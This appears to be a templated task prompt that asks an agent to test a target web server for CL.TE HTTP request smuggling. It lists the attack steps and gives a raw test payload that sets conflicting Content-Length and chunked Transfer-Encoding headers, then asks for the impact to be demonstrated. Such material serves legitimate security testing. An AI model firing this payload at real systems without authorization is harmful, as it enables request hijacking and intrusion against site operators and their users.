Test the target web infrastructure for HTTP Request Smuggling vulnerabilities (CL.TE variant). Request smuggling occurs when front-end and back-end servers disagree on request boundaries.

CL.TE (Content-Length vs Transfer-Encoding) attack steps:
1. Craft a request with both Content-Length and Transfer-Encoding: chunked headers
2. Set Content-Length to the length of the smuggled prefix
3. Use chunked encoding to hide the smuggled request from the front-end
4. Verify if the back-end processes the smuggled request as a separate request: {target_url}

Test payload:
```
POST / HTTP/1.1
Host: {target_host}
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

Document whether the infrastructure is vulnerable and demonstrate the impact.